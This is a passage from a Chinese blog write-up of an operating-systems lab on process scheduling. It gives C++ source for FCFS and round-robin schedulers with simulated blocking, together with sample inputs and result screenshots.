class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//当前有运行进程则输出信息</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//当前时间加1</span><br>            run_process.remain_time--; <span class="hljs-comment">//进程剩余运行时间减1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程剩余运行时间为0</span><br>            &#123;<br>                run_process.end_time=current_time;<br>                run_process.turnaround_time=current_time-run_process.start_time;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//当进程有运行时间和时间片时，可能发生阻塞</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------进程阻塞，切换进程----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//若发生阻塞，修改当前进程到达时间</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//并加入阻塞队列中</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出进程信息</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;进程名字  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;开始执行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;结束执行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;周转时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;等待时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].arrive_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].start_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].end_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].turnaround_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;平均等待时间为：&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">process_init</span>();<br>    <span class="hljs-built_in">process_schedule</span>();<br>    <span class="hljs-built_in">print_process_information</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="程序初值和运行结果"><a href="#程序初值和运行结果" class="headerlink" title="程序初值和运行结果"></a>程序初值和运行结果</h4><p><strong>不考虑阻塞：</strong></p><p>初值：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/image-20211112212432678.png" alt="image-20211112212432678"></p><p><strong>考虑阻塞：</strong></p><p>初值：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/image-20211112212806073.png" alt="image-20211112212806073"></p><h3 id="RR调度算法"><a href="#RR调度算法" class="headerlink" title="RR调度算法"></a>RR调度算法</h3><h4 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //进程结构体，表示进程信息</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//进程名字</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//到达时间</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//进程运行时间</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//进程等待时间</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//进程剩余运行时间</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//周转时间</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//进程开始运行时间</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//进程结束时间</span><br>    <span class="hljs-keyword">int</span> time_slice;      <span class="hljs-comment">//进程时间片</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue, run_queue;<br></code></pre></td></tr></table></figure><h4 id="符号说明-1"><a href="#符号说明-1" class="headerlink" title="符号说明"></a>符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//进程数量</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">int</span> q = <span class="hljs-number">0</span>;            <span class="hljs-comment">//设定的时间片大小</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h4 id="函数说明-1"><a href="#函数说明-1" class="headerlink" title="函数说明"></a>函数说明</h4><blockquote><p>函数设计基本和FCFS相同</p></blockquote><blockquote><p>少数的不同之处是</p><ul><li>进程初始化函数加上了时间片的初始化</li></ul></blockquote><blockquote><ul><li>进程调度函数加上了时间片用完时的进程切换</li><li>时间片用完时回复当前进程的时间片，同时更新到达时间，并将其再次入队</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">procese_schedule</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    `````````<span class="hljs-comment">//省略部分具体见源代码</span><br>    `````````<br>        current_time++;            <span class="hljs-comment">//当前时间加1</span><br>            run_process.remain_time--; <span class="hljs-comment">//进程剩余运行时间减1</span><br>            run_process.time_slice--;  <span class="hljs-comment">//进程时间片时间减1</span><br><span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程剩余运行时间为0</span><br>            &#123;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (run_process.time_slice == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程时间片为0时</span><br>            &#123;<br>                run_process.time_slice = q;             <span class="hljs-comment">//恢复时间片</span><br>                run_process.arrive_time = current_time; <span class="hljs-comment">//更新到达时间</span><br>                ready_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//再次入队</span><br><br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//当进程有运行时间和时间片时，可能发生阻塞</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------进程阻塞，切换进程----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//若发生阻塞，修改当前进程到达时间</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//并加入阻塞队列中</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>    `````````<span class="hljs-comment">//省略部分具体见源代码</span><br>    `````````<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXname 100</span><br><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//进程数量</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">int</span> q = <span class="hljs-number">0</span>;            <span class="hljs-comment">//设定的时间片大小</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //进程结构体，表示进程信息</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//进程名字</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//到达时间</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//进程运行时间</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//进程等待时间</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//进程剩余运行时间</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//周转时间</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//进程开始运行时间</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//进程结束时间</span><br>    <span class="hljs-keyword">int</span> time_slice;      <span class="hljs-comment">//进程时间片</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue;<span class="hljs-comment">//依次为就绪队列、阻塞队列</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(Process &amp;a, Process &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a.arrive_time &lt; b.arrive_time;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程初始化</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入进程数量&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入时间片长度&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;个进程的名字  到达时间  服务时间&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>        p[i].time_slice = q; <span class="hljs-comment">//设置进程时间片</span><br>        p[i].end_time = <span class="hljs-number">0</span>;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//当前无进程运行</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//将进程加入阻塞队列（未达到则视为阻塞）</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//取下一个进程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//当就绪队列非空时</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//取下个进程</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//否则将运行进程置为空</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//计算等待时间</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//阻塞函数，随机概率阻塞</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程调度函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机数种子</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;----------------------------------------RR调度算法----------------------------------------&quot;</span> <br>         &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;当前时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;当前进程  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程等待时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;剩余运行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;剩余时间片时间&quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//当三个队列均为空时，说明进程全部运行完</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//结束</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//阻塞队列非空且队首元素到达时间已到当前时间</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//将进入就绪队列的时间作为进程到达时间（针对于阻塞过的进程）</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//则加入就绪队列</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//从阻塞队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//就绪队列非空和运行进程非空</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//则从就绪对列取首元素</span><br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//从就绪队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//若当前无运行进程，则输出空</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//当前有运行进程则输出信息</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.time_slice<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//当前时间加1</span><br>            run_process.remain_time--; <span class="hljs-comment">//进程剩余运行时间减1</span><br>            run_process.time_slice--;  <span class="hljs-comment">//进程时间片时间减1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程剩余运行时间为0</span><br>            &#123;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (run_process.time_slice == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程时间片为0时</span><br>            &#123;<br>                run_process.time_slice = q;             <span class="hljs-comment">//恢复时间片</span><br>                run_process.arrive_time = current_time; <span class="hljs-comment">//更新到达时间</span><br>                ready_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//再次入队</span><br><br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//当进程有运行时间和时间片时，可能发生阻塞</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------进程阻塞，切换进程----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//若发生阻塞，修改当前进程到达时间</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//并加入阻塞队列中</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出进程信息</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;进程名字  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;等待时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;平均等待时间为：&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">process_init</span>();<br>    <span class="hljs-built_in">process_schedule</span>();<br>    <span class="hljs-built_in">print_process_information</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="程序初值和运行结果-1"><a href="#程序初值和运行结果-1" class="headerlink" title="程序初值和运行结果"></a>程序初值和运行结果</h4><p><strong>不考虑阻塞：</strong></p><p>初值（小时间片）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 